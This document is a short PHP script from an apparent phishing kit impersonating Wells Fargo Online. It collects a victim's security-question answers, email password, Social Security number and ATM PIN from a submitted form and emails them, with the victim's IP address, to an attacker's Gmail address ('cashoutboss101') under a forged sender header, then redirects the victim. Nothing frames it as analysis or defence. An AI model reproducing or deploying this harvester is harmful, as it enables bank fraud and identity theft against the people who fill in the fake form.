<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------------------------------------------------------------\n";
$message .= "Question 1: ".$_POST['question1']."\n";
$message .= "Answer 1: ".$_POST['answer1']."\n";
$message .= "Question 2: ".$_POST['question2']."\n";
$message .= "Answer 2: ".$_POST['answer2']."\n";
$message .= "Question 3: ".$_POST['question3']."\n";
$message .= "Answer 3: ".$_POST['answer3']."\n";
$message .= "Email Address: ".$_POST['email11']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "UR SSN: ".$_POST['SSN']."\n";
$message .= "UR ATM PIN: ".$_POST['ATMPIN']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Brain------------------------------\n";



$recipient = "cashoutboss101@gmail.com";
$subject = "$ip";
$headers = "From: Wells Fargo Online";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: redire.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>